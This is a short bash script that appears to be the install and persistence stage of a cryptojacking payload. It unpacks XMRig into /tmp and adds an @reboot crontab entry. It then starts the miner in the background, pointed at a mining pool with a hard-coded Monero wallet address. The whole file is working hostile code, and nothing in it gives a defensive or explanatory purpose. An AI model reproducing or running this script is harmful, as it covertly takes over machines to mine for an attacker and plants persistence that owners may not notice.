#!/bin/bash
tar -xzf /tmp/xmrig.tar.gz -C /tmp


XMRIG_DIR="/tmp/xmrig-6.24.0"
if [ ! -d "$XMRIG_DIR" ]; then
    echo "!!"
    exit 1
fi

chmod +x "$XMRIG_DIR/xmrig"

(crontab -l 2>/dev/null; echo "@reboot $XMRIG_DIR/xmrig --url=moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG") | crontab -

nohup "$XMRIG_DIR/xmrig" --daemon --url=moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG  &
